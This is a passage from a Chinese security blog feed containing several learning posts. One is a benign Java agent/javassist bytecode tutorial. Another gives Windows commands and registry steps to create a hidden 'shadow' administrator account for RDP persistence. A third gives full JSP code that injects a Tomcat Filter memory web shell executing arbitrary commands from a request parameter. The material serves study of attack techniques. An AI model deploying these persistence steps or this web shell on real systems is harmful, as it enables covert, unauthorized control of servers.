if(&quot;org/com/Main&quot;.equals(className))&#123;            final ClassPool classPool = ClassPool.getDefault();            try &#123;                final CtClass clazz = classPool.get(&quot;org.com.Main&quot;);                CtMethod main = clazz.getDeclaredMethod(&quot;test&quot;);                String methodBody = &quot;&#123; String c = $1.concat(\&quot;-AAA-\&quot;).concat($2);&quot; +                        &quot;System.out.println(&quot;+ &quot;c.toString()&quot;+&quot;);&#125;&quot;;                main.setBody(methodBody);                // 返回字节码，并且detachCtClass对象                byte[] byteCode = clazz.toBytecode();                //detach的意思是将内存中曾经被javassist加载过的Main对象移除，如果下次有需要在内存中找不到会重新走javassist加载                clazz.detach();                return byteCode;            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;        return null;    &#125;&#125;</code></pre><p>src下/META-INF /MANIFEST.MF</p><pre><code>Manifest-Version: 1.0Can-Redefine-Classes: trueCan-Retransform-Classes: truePremain-Class: org.com.Agent</code></pre><ul><li>注意！！！第五行要留空<br>然后生成agent_test.jar随后再创建一个Main.java</li></ul><p>Main.java</p><pre><code class="java">package org.com;public class Main &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;thisismain&quot;);        test(&quot;a&quot;,&quot;bcd&quot;);    &#125;    public static void test(String a1, String a2)&#123;        System.out.println(&quot;test&quot;);    &#125;&#125;</code></pre><p>这里要记得添加参数</p><blockquote><p>-javaagent:out/artifacts/agent_test_jar/agent_test.jar</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqbyuws73tj30ue0l6q3x.jpg" alt=""><br>然后运行Main文件可以看见<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqbyogvj1sj30dl05p3yj.jpg" alt=""></p><p>成功修改了字节码。<br>在DefineTransformer中，里面出现了$1,$2.这指的是函数的第一个和第二个参数，这之前的文章有说到过。</p><h2 id="JVM启动后"><a href="#JVM启动后" class="headerlink" title="JVM启动后"></a>JVM启动后</h2><p>上面介绍的Instrumentation是这JDK1.5中提供的，开发者只能在main加载之前添加手脚，在Java SE 6中，提供了新的代理agentmain</p><p>跟premain方法一样<br>JVM将首先寻找[1]，如果没有发现[1]，再寻找[2]。如果希望在目标JVM运行时加载Agent，则需要实现下面的方法：</p><ul><li>public static void agentmain(String agentArgs, Instrumentation inst);</li><li>public static void agentmain(String agentArgs);</li></ul><p>这两组方法的第一个参数AgentArgs是随同 “– javaagent”一起传入的程序参数，如果这个字符串代表了多个参数，就需要自己解析这些参数。inst是Instrumentation类型的对象，是JVM自动传入的，我们可以拿这个参数进行类增强等操作。</p><p>指定Main-Class</p><p>Agent-Class: class</p><p>Agent.java</p><pre><code class="java">package org.com;import javassist.*;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain;//public class DefineTransformer implements ClassFileTransformer &#123;//    @Override//    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;//        System.out.println(&quot;premain load Class:&quot; + className);//        return new byte[0];//    &#125;//&#125;public class DefineTransformer implements ClassFileTransformer&#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        if(&quot;org/com/Main&quot;.equals(className))&#123;            final ClassPool classPool = ClassPool.getDefault();            try &#123;                final CtClass clazz = classPool.get(&quot;org.com.Main&quot;);                CtMethod main = clazz.getDeclaredMethod(&quot;test&quot;);                String methodBody = &quot;&#123; String c = $1.concat(\&quot;-AAA-\&quot;).concat($2);&quot; +                        &quot;System.out.println(&quot;+ &quot;c.toString()&quot;+&quot;);&#125;&quot;;                main.setBody(methodBody);                // 返回字节码，并且detachCtClass对象                byte[] byteCode = clazz.toBytecode();                //detach的意思是将内存中曾经被javassist加载过的Main对象移除，如果下次有需要在内存中找不到会重新走javassist加载                clazz.detach();                return byteCode;            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;        return null;    &#125;&#125;</code></pre><p>Main.java</p><pre><code class="java">package org.com;import com.sun.tools.attach.*;import java.io.IOException;import java.util.List;public class Main &#123;    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;        System.out.println(&quot;running JVM start &quot;);        test(&quot;a&quot;,&quot;bcd&quot;);        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();        for(VirtualMachineDescriptor vmd: list)&#123;            System.out.println(vmd.displayName());            if(vmd.displayName().equals(&quot;org.com.Main&quot;))&#123;                VirtualMachine attach = VirtualMachine.attach(vmd.id());                attach.loadAgent(&quot;F:\\IDEAcode\\agent_test\\out\\artifacts\\agent_test_jar\\agent_test.jar&quot;);                attach.detach();            &#125;        &#125;    &#125;    public static void test(String a1, String a2)&#123;        System.out.println(&quot;test&quot;);    &#125;&#125;</code></pre><p>这里偷懒了，用了别人写的代码<br>当然MANIFEST.MF文件也是要修改的，这里就不再说怎么改了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqc07utyuvj31f6099jsn.jpg" alt=""></p><h3 id="premain与agentmain的区别："><a href="#premain与agentmain的区别：" class="headerlink" title="premain与agentmain的区别："></a>premain与agentmain的区别：</h3><p>premain和agentmain两种方式最终的目的都是为了回调Instrumentation实例并激活sun.instrument.InstrumentationImpl#transform()（InstrumentationImpl是Instrumentation的实现类）从而回调注册到Instrumentation中的ClassFileTransformer实现字节码修改，本质功能上没有很大区别。两者的非本质功能的区别如下：</p><ul><li><p>premain方式是JDK1.5引入的，agentmain方式是JDK1.6引入的，JDK1.6之后可以自行选择使用premain或者agentmain。</p></li><li><p>premain需要通过命令行使用外部代理jar包，即-javaagent:代理jar包路径；agentmain则可以通过attach机制直接附着到目标VM中加载代理，也就是使用agentmain方式下，操作attach的程序和被代理的程序可以是完全不同的两个程序。</p></li><li><p>premain方式回调到ClassFileTransformer中的类是虚拟机加载的所有类，这个是由于代理加载的顺序比较靠前决定的，在开发者逻辑看来就是：所有类首次加载并且进入程序main()方法之前，premain方法会被激活，然后所有被加载的类都会执行ClassFileTransformer列表中的回调。</p></li><li><p>agentmain方式由于是采用attach机制，被代理的目标程序VM有可能很早之前已经启动，当然其所有类已经被加载完成，这个时候需要借助Instrumentation#retransformClasses(Class&lt;?&gt;… classes)让对应的类可以重新转换，从而激活重新转换的类执行ClassFileTransformer列表中的回调。</p></li><li><p>通过premain方式的代理Jar包进行了更新的话，需要重启服务器，而agentmain方式的Jar包如果进行了更新的话，需要重新attach，但是agentmain重新attach还会导致重复的字节码插入问题，不过也有Hotswap和DCE VM方式来避免。</p></li></ul><h2 id="基于agent的内存马"><a href="#基于agent的内存马" class="headerlink" title="基于agent的内存马"></a>基于agent的内存马</h2><p>我自己试了试，没有成功。所以打算中后面的文章里面结合序列化在试试看。但是我中github上找到了其他师傅打包好的jar包：<a href="https://github.com/ydnzol/memshell">https://github.com/ydnzol/memshell</a></p><p>不过这个jar包没有使用ShutdownHook来复活内存马。这里我是在docker上进行试验的，不得不吐槽一下m1真的有点坑呀，后来无奈下只能去Windows10上搭docker的环境了QAQ。</p><p>但是因为很久没用docker了，Windows以前的docker好像没用了，我去官网上查，发现之前的版本已经作废，搞到半夜才弄好，我果然是废物QAQ。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqc5o74n5mj30lc090jrl.jpg" alt=""></p><p>具体agent内存马下篇文章再写吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;title: Java agent学习&lt;br&gt;author: xiaotan&lt;br&gt;cover: &lt;a href=&quot;https://tva1.sinaimg.cn/large/008i3skNly1gqc62dvybnj31ow0syqv6.jpg&quot;&gt;https:
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>内网渗透--远程桌面</title>
    <link href="http://yoursite.com/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"/>
    <id>http://yoursite.com/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/</id>
    <published>2021-04-29T12:05:01.000Z</published>
    <updated>2021-07-29T05:50:56.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透–远程桌面"><a href="#内网渗透–远程桌面" class="headerlink" title="内网渗透–远程桌面"></a>内网渗透–远程桌面</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学代码审计有些枯燥，加上俺内网啥也不会，学学内网换换口味。</p><h1 id="隐藏用户的创建"><a href="#隐藏用户的创建" class="headerlink" title="隐藏用户的创建"></a>隐藏用户的创建</h1><p>因为在Windows环境下创建用户后面如果带入一个“$”符号，在net user时默认是不显示的。</p><p>利用条件：获得管理员权限</p><p>首先在cs中输入以下命令</p><blockquote><p>shell net user admin$ 123456 /add</p></blockquote><blockquote><p>shell net localgroup administrators admin$ /add</p></blockquote><p>第一句是创建一个admin$用户密码为123456.第二句是将用户加入管理组。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0ls1cy2lj30hi065dfx.jpg" alt=""></p><p>我们来验证一下，使用net user命令并无admin用户<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0lst1s90j30i308i74c.jpg" alt=""></p><p>然后远程打开3389端口。</p><blockquote><p>reg add “HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</p></blockquote><p>现在已经可以远程连接了，但是中用户组中依然可以看见admin$<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qc4qewkj30m30giaan.jpg" alt=""></p><p>现在我们想办法把这里的admin$也隐藏掉</p><p>利用 运行 输入regedit 打开注册表 ，找到如下图的SAM</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qjibq6xj30sc0i53zp.jpg" alt=""><br>选择SAM 项 ，在工具栏上的“编辑 &gt; 权限” 中设置权限 ，将 Administrators组 的权限设置为完全控制 后保存</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qkwb6svj30bu0ge0t4.jpg" alt=""></p><p>注意！！！这里的拒绝修改是不可逆的</p><p>设置好后重开页面会出现新的子项</p><blockquote><p>SAM &gt; Domains &gt; Account &gt; Users 和 Names</p></blockquote><p>分别找到Administrator用户和admin$用户的两个项<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qx3bgeyj30pm0godlu.jpg" alt=""></p><p>将administrator的F表复制下来，替换admin$的表后导出<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qy6yiodj30lr0fwmxu.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qyechzwj304306t3yf.jpg" alt=""></p><p>再将admin$用户删除</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qymnmpij30cm06bmx7.jpg" alt=""></p><blockquote><p>net user admin$ /del</p></blockquote><p>再将注册表导入</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qzn13b9j30dv03qt8v.jpg" alt=""></p><p>现在用户组中已经看不见我们的影子用户</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qzsrqxnj30p00c8t9f.jpg" alt=""></p><p>但是现在3389不能连接</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0r0hkgesj30db0gkdgd.jpg" alt=""><br>点击右下角选择用户添加admin$</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0r0sl2qxj30c70bcjrl.jpg" alt=""></p><p>现在就可以登录了。</p>]]></content>
    
    <summary type="html">
    
      内网
    
    </summary>
    
    
      <category term="内网" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>内存马初探</title>
    <link href="http://yoursite.com/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/"/>
    <id>http://yoursite.com/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/</id>
    <published>2021-04-18T10:05:01.000Z</published>
    <updated>2021-07-29T05:46:45.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内存马初探-Filter"><a href="#内存马初探-Filter" class="headerlink" title="内存马初探-Filter"></a>内存马初探-Filter</h1><h2 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h2><p>tomcat其实质上就是一个大点的servlet容器，那什么是容器呢，我觉得其实就是一个类。在tomcat中各个容器之间嵌套。而这些容器都是有生命周期的java类，都继承了共同的接口Lifecycle，所以Lifecycle就是这些容器的顶层接口。下面来谈谈存在哪些容器。</p><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ul><li>init()方法：初始化容器组件，它必须在启动容器之前调用。它会创建许多对象。</li><li>start():启动容器，比如启动一个Server。</li><li>stop()：停止执行</li><li>destroy()：销毁这个容器。</li><li>Server容器：一个StandardServer类实例就表示一个Server容器</li><li>Service容器：一个StandardService类实例就表示一个Service容器</li><li>Engine容器：一个StandardEngine类实例就表示一个Engine容器。</li><li>Host容器：一个StandardHost类实例就表示一个Host容器。</li><li>Context容器：一个StandardContext类实例就表示一个Context容器。</li><li>Wrapper容器：一个StandardWrapper类实例就表示一个Wrapper容器。</li></ul><p>这些容器全都是从上到下嵌套，<strong>需要注意的是这些容器虽然存在父子关系，但是它们的java类并没有父子。</strong></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnsa4ppxhj30o60mwmyx.jpg" alt=""></p><pre><code class="java">/**     * Add a child Container, only if the proposed child is an implementation     * of Context.     *     * @param child Child container to be added     */    @Override    public void addChild(Container child) &#123;        child.addLifecycleListener(new MemoryLeakTrackingListener());        if (!(child instanceof Context))//这里说明Host容器的子容器只能是Context容器            throw new IllegalArgumentException                (sm.getString(&quot;standardHost.notContext&quot;));        super.addChild(child);    &#125;</code></pre><p>一个Host容器中可以有多个Wrapper容器。</p><pre><code class="java">    /**     * Add a child Container, only if the proposed child is an implementation     * of Wrapper.     *     * @param child Child container to be added     *     * @exception IllegalArgumentException if the proposed container is     *  not an implementation of Wrapper     */    @Override    public void addChild(Container child) &#123;        // Global JspServlet        Wrapper oldJspServlet = null;        if (!(child instanceof Wrapper)) &#123;//这里说明Context容器的子容器只能是Wrapper容器。            throw new IllegalArgumentException                (sm.getString(&quot;standardContext.notWrapper&quot;));        &#125;　　　　　　//这里删除了部分代码    &#125;</code></pre><h2 id="内存马简单介绍"><a href="#内存马简单介绍" class="headerlink" title="内存马简单介绍"></a>内存马简单介绍</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>servlet-api<ul><li>filter型</li><li>servlet型</li><li>listener型</li></ul></li><li>指定框架，如spring</li><li>字节码增强型</li><li>任意JSP文件隐藏</li></ul><p>在Tomcat中我们对Servlet进行访问的时候会先通过Filter，如下图所示。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnt4cngtwj30hv0abjrc.jpg" alt=""></p><p>因此我们只要中Filter中插入恶意代码，就可以进行命令执行，形成一个内存马。</p><p>Filter：自定义Filter的实现，需要实现javax.servlet.Filter下的init()、doFilter()、destroy()三个方法。</p><ul><li>启动时调用init()方法</li><li>工作时调用doFilter()</li><li>销毁时调用destroy()</li></ul><p>在tomcat中ServletContext的实现是ApplicationContext。在Web应用中，获取的ServletContext实际上是ApplicationContextFacade的对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnthaev47j30q80wegs4.jpg" alt=""></p><h3 id="Filter注册流程"><a href="#Filter注册流程" class="headerlink" title="Filter注册流程"></a>Filter注册流程</h3><p>我们自己写一个Filter然后下断点，然后跟进createFilterChain。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpny2fgoorj31do0e4jui.jpg" alt=""></p><pre><code class="java">filterChain.setServlet(servlet);            filterChain.setSupport(((StandardWrapper)wrapper).getInstanceSupport());            StandardContext context = (StandardContext)wrapper.getParent();            FilterMap[] filterMaps = context.findFilterMaps();            if (filterMaps != null &amp;&amp; filterMaps.length != 0) &#123;                String servletName = wrapper.getName();                int i;                ApplicationFilterConfig filterConfig;                boolean isCometFilter;                for(i = 0; i &lt; filterMaps.length; ++i) &#123;                    if (this.matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; this.matchFiltersURL(filterMaps[i], requestPath)) &#123;                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());                        if (filterConfig != null) &#123;                            isCometFilter = false;                            if (comet) &#123;                                try &#123;                                    isCometFilter = filterConfig.getFilter() instanceof CometFilter;                                &#125; catch (Exception var18) &#123;                                    Throwable t = ExceptionUtils.unwrapInvocationTargetException(var18);                                    ExceptionUtils.handleThrowable(t);                                &#125;                                if (isCometFilter) &#123;                                    filterChain.addFilter(filterConfig);                                &#125;                            &#125; else &#123;                                filterChain.addFilter(filterConfig);                            &#125;                        &#125;                    &#125;                &#125;                for(i = 0; i &lt; filterMaps.length; ++i) &#123;                    if (this.matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; this.matchFiltersServlet(filterMaps[i], servletName)) &#123;                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());                        if (filterConfig != null) &#123;                            isCometFilter = false;                            if (comet) &#123;                                try &#123;                                    isCometFilter = filterConfig.getFilter() instanceof CometFilter;                                &#125; catch (Exception var17) &#123;                                &#125;                                if (isCometFilter) &#123;                                    filterChain.addFilter(filterConfig);                                &#125;                            &#125; else &#123;                                filterChain.addFilter(filterConfig);                            &#125;                        &#125;                    &#125;                &#125;                return filterChain;            &#125; else &#123;                return filterChain;            &#125;        &#125;</code></pre><p>可以看见这里主要是对filterconfig和filterMap进行的操作，而在代码中首先获取了StandardContext其中有三个成员变量和filter相关：</p><p>filter关键的3个属性和2个方法</p><ul><li>FilterConfigs存放了filterDef还保存了当时的Context</li><li>FilterDefs存放了filter的定义，比如名称跟对应的类，类似于<pre><code>  &lt;filter&gt;      &lt;filter-name&gt;filterDemo&lt;/filter-name&gt;      &lt;filter-class&gt;filterDemo&lt;/filter-class&gt;  &lt;/filter&gt;</code></pre></li><li>FilterMaps 存放了所有filter相关的信息包括filterName和urlPattern</li><li>addFilterDef(填充filterDef对象)</li><li>filterStart(初始化 filterConfigs )</li></ul><pre><code class="java">//tomcat 标准 contextpublic class StandardContext extends ContainerBase        implements Context, NotificationEmitter &#123;    //servletContext     protected ApplicationContext context = null;    //获取servletContext    @Override    public ServletContext getServletContext() &#123;        if (context == null) &#123;            context = new ApplicationContext(this);            if (altDDName != null)                context.setAttribute(Globals.ALT_DD_ATTR,altDDName);        &#125;        return context.getFacade();    &#125;    //filterMaps 封装的对象    private final ContextFilterMaps filterMaps = new ContextFilterMaps();        @Override    //servletContext添加filter时调用    public void addFilterMap(FilterMap filterMap) &#123;        validateFilterMap(filterMap);        // Add this filter mapping to our registered set        filterMaps.add(filterMap);        fireContainerEvent(&quot;addFilterMap&quot;, filterMap);    &#125;    //获取filterMaps     //请求到达时获取    @Override    public FilterMap[] findFilterMaps() &#123;        return filterMaps.asArray();    &#125;    //filtername 和 filterconfig 映射    private Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = new HashMap&lt;&gt;();    //通过filtername获取filterconfig bean实例    public FilterConfig findFilterConfig(String name) &#123;        return filterConfigs.get(name);    &#125;    //通过 filterDefs 生成 filterconfigs 映射    public boolean filterStart() &#123;        if (getLogger().isDebugEnabled()) &#123;            getLogger().debug(&quot;Starting filters&quot;);        &#125;        // Instantiate and record a FilterConfig for each defined filter        boolean ok = true;        synchronized (filterConfigs) &#123;            filterConfigs.clear();            for (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;                String name = entry.getKey();                if (getLogger().isDebugEnabled()) &#123;                    getLogger().debug(&quot; Starting filter &#39;&quot; + name + &quot;&#39;&quot;);                &#125;                try &#123;                    ApplicationFilterConfig filterConfig =                            new ApplicationFilterConfig(this, entry.getValue());                    filterConfigs.put(name, filterConfig);                &#125; catch (Throwable t) &#123;                    t = ExceptionUtils.unwrapInvocationTargetException(t);                    ExceptionUtils.handleThrowable(t);                    getLogger().error(sm.getString(                            &quot;standardContext.filterStart&quot;, name), t);                    ok = false;                &#125;            &#125;        &#125;        return ok;    &#125;    //filterDefs定义    private Map&lt;String, FilterDef&gt; filterDefs = new HashMap&lt;&gt;();    //添加filterDef    public void addFilterDef(FilterDef filterDef) &#123;        synchronized (filterDefs) &#123;            filterDefs.put(filterDef.getFilterName(), filterDef);        &#125;        fireContainerEvent(&quot;addFilterDef&quot;, filterDef);    &#125;    //查找filterDef    public FilterDef findFilterDef(String filterName) &#123;        synchronized (filterDefs) &#123;            return filterDefs.get(filterName);        &#125;    &#125;&#125;</code></pre><p>ApplicationContext</p><p>实现了 ServletContext 中的 addFilter 方法</p><p>向属性中的StandandContext实例添加filterDef</p><pre><code class="java">public class ApplicationContext implements ServletContext &#123;    //标准上下文属性  包含 filterConfigs filterMaps filterDefs 属性    private final StandardContext context;    //调用StandandContext添加filterDef    private FilterRegistration.Dynamic addFilter(String filterName,            String filterClass, Filter filter) throws IllegalStateException &#123;        if (filterName == null || filterName.equals(&quot;&quot;)) &#123;            throw new IllegalArgumentException(sm.getString(                    &quot;applicationContext.invalidFilterName&quot;, filterName));        &#125;        if (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;            //TODO Spec breaking enhancement to ignore this restriction            throw new IllegalStateException(                    sm.getString(&quot;applicationContext.addFilter.ise&quot;,                            getContextPath()));        &#125;        FilterDef filterDef = context.findFilterDef(filterName);        // Assume a &#39;complete&#39; FilterRegistration is one that has a class and        // a name        if (filterDef == null) &#123;            filterDef = new FilterDef();            filterDef.setFilterName(filterName);            context.addFilterDef(filterDef);        &#125; else &#123;            if (filterDef.getFilterName() != null &amp;&amp;                    filterDef.getFilterClass() != null) &#123;                return null;            &#125;        &#125;        if (filter == null) &#123;            filterDef.setFilterClass(filterClass);        &#125; else &#123;            filterDef.setFilterClass(filter.getClass().getName());            filterDef.setFilter(filter);        &#125;        return new ApplicationFilterRegistration(filterDef, context);    &#125;&#125;</code></pre><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>context启动时，调用ServletContainerInitializers添加filter，调用AbstractFilterRegistrationBean类的addRegistration方法向context添加filter</li><li>context中不存在FilterDef则创建对应FilterDef</li><li>AbstractFilterRegistrationBean中configure方法添加匹配filter的uri，默认为/*</li><li>context启动时，调用filterStart方法配置初始化ApplicationFilterConfig</li><li>调用filter的init方法</li><li>对每次到达的请求在StandardWrapperVavel的invoke方法中创建过滤器链</li><li>根据名称获得ApplicationFilterConfig添加到过滤器链，通过ApplicationFilterConfig来获取filter执行</li></ol><h3 id="具体函数"><a href="#具体函数" class="headerlink" title="具体函数"></a>具体函数</h3><ol><li><p>ServletContainerInitializer(TomcatStarter实现类).onStartup() 调用 ServletContextInitializer.onStartup(ServletContext)</p></li><li><p>ServletContextInitializer(AbstractFilterRegistrationBean实现类).onStartup(ServletContext) 调用 ServletContext.addFilter() 方法</p></li><li><p>ServletContext(ApplicationContext实现类).addFilter 方法调用了 StandandContext.addFilterDef()</p></li><li><p>StandandContext.addFilterDef() 方法填充 StandandContext.filterDefs</p></li><li><p>StandandContext.filterStart()方法根据 StandandContext.filterDefs属性 填充 StandandContext.filterConfigs</p></li><li><p>ApplicationFilterFactory根据StandandContext生成filterchain</p></li><li><p>StandardWrapperValve中调用filterchain.doFilter() 方法</p></li><li><p>filterchain结束后调用servlet.service方法</p></li></ol><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><ul><li>获取standcontext</li><li>创建恶意Filter</li><li>创建FilterDef并将Filtername和FilterClass放入</li><li>将FilterDef添加到FilterDefs和filterconfig中</li><li>创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去。</li></ul><h3 id="如何获取stancontext"><a href="#如何获取stancontext" class="headerlink" title="如何获取stancontext"></a>如何获取stancontext</h3><p>到这里我们就要思考context是如何获取的呢？下面给出三种方法</p><ul><li>由ServletContext转StandardContext如果可以直接获取到request对象的话可以用这种方法</li><li>从当前线程中获取</li><li>从MBean中获取<br>最后给出代码：</li></ul><pre><code class="java">&lt;%--  Created by IntelliJ IDEA.  User: xiaotan  Date: 2021/4/16  Time: 21:03  To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    String name =&quot;pyshare&quot;;    ServletContext servletContext = request.getServletContext();    ApplicationContextFacade contextFacade = (ApplicationContextFacade) servletContext;    Field applicationContextField = ApplicationContextFacade.class.getDeclaredField(&quot;context&quot;);    applicationContextField.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(contextFacade);    Field field = ApplicationContext.class.getDeclaredField(&quot;context&quot;);    field.setAccessible(true);    StandardContext standardContext = (StandardContext) field.get(applicationContext);    Field filterConfigs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);    filterConfigs.setAccessible(true);    Map configs = (Map) filterConfigs.get(standardContext);    if (configs.get(name) == null)&#123;        Filter filter = new Filter()&#123;            @Override            public void init(FilterConfig filterConfig)  &#123;            &#125;            @Override            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                String cmd;                if ((cmd = servletRequest.getParameter(&quot;pyshare&quot;)) != null) &#123;                    Process process = Runtime.getRuntime().exec(cmd);                    java.io.BufferedReader bufferedReader = new java.io.BufferedReader(                            new java.io.InputStreamReader(process.getInputStream()));                    StringBuilder stringBuilder = new StringBuilder();                    String line;                    while ((line = bufferedReader.readLine()) != null) &#123;                        stringBuilder.append(line + &#39;\n&#39;);                    &#125;                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());                    servletResponse.getOutputStream().flush();                    servletResponse.getOutputStream().close();                    return;                &#125;                filterChain.doFilter(servletRequest, servletResponse);            &#125;            @Override            public void destroy() &#123;            &#125;        &#125;;        FilterDef filterDef = new FilterDef();        filterDef.setFilter(filter);        filterDef.setFilterName(name);        filterDef.setFilterClass(filter.getClass().getName());        standardContext.addFilterDef(filterDef);        FilterMap filterMap = new FilterMap();        filterMap.setFilterName(name);        filterMap.setDispatcher(DispatcherType.REQUEST.name());        filterMap.addURLPattern(&quot;/*&quot;);        /**         * 将filtermap 添加到 filterMaps 中的第一个位置         */        standardContext.addFilterMapBefore(filterMap);        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);        constructor.setAccessible(true);        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);        configs.put(name,filterConfig);        out.write(&quot;success&quot;);    &#125;%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnzmkkhd9j310v0u0txq.jpg" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>但是其实还是没有实现无文件，后面还要结合反序列化漏洞注入内存马</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a><br><a href="https://www.anquanke.com/post/id/219177">https://www.anquanke.com/post/id/219177</a><br><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw</a></p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>solr漏洞分析--CVE-2017-3163</title>
    <link href="http://yoursite.com/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/"/>
    <id>http://yoursite.com/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/</id>
    <published>2021-04-11T12:05:01.000Z</published>
    <updated>2021-07-29T05:50:54.596Z</updated>
    
